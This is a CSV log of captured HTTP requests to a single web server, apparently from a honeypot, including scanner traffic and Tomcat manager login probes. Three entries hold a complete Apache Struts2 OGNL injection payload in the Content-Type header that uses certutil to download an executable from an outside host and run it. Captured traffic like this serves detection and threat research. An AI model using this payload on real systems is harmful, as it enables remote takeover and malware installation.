ID,ADDR,VALUE,TIME
REQ_18_P80,,"b""GET /index.do HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/idxbslorzqhxpsi29850.exe & cmd.exe /c C:/Windows/temp/idxbslorzqhxpsi29850.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/index.do\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.780875
REQ_19_P80,,b'GET / HTTP/1.0\r\nUser-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)\r\nAccept: */*\r\n\r\n',2022-05-03 00:05:56.780875
REQ_20_P80,,b'GET / HTTP/1.0\r\nUser-Agent: NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com\r\nAccept: */*\r\n\r\n',2022-05-03 00:05:56.780875
REQ_21_P80,,"b'GET /manager/html HTTP/1.1\r\nAccept: text/html, application/xhtml+xml, */*\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)\r\nHost: 3.14.69.228:80\r\nAuthorization: Basic Og==\r\nCache-Control: max-stale=0\r\nConnection: Keep-Alive\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_22_P80,,"b""GET /struts2-rest-showcase/orders.xhtml HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/idxbslorzqhxpsi29850.exe & cmd.exe /c C:/Windows/temp/idxbslorzqhxpsi29850.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/struts2-rest-showcase/orders.xhtml\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.796007
REQ_23_P80,,"b'GET /login.cgihttp://3.14.69.228/login.cgi HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_24_P80,,"b""GET /index.action HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe C:/Windows/temp/idxbslorzqhxpsi29850.exe & cmd.exe /c C:/Windows/temp/idxbslorzqhxpsi29850.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\r\nAccept: */*\r\nAccept-Language: zh-cn\r\nReferer: http://3.14.69.228:80/index.action\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\r\nHost: 3.14.69.228\r\n\r\n""",2022-05-03 00:05:56.796007
REQ_25_P80,,"b'GET / HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_26_P80,,"b'GET /favicon.ico HTTP/1.1\r\nHost: 3.14.69.228\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36\r\nAccept: image/webp,image/apng,image/*,*/*;q=0.8\r\nReferer: http://3.14.69.228/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-IN;q=0.9,en;q=0.8\r\n\r\n'",2022-05-03 00:05:56.796007
REQ_27_P80,,b'GET /manager/html HTTP/1.1\r\nConnection: Keep-Alive\r\nAuthorization: Basic YWRtaW46\r\nHost: 3.14.69.228\r\n\r\n',2022-05-03 00:05:56.796007
REQ_28_P80,,"b'GET / HTTP/1.1\r\nHost: 3.14.69.228\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: deflate, gzip, identity\r\nAccept-Language: en-US;q=0.6,en;q=0.4\r\nUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1\r\n\r\n'",2022-05-03 00:05:56.796007
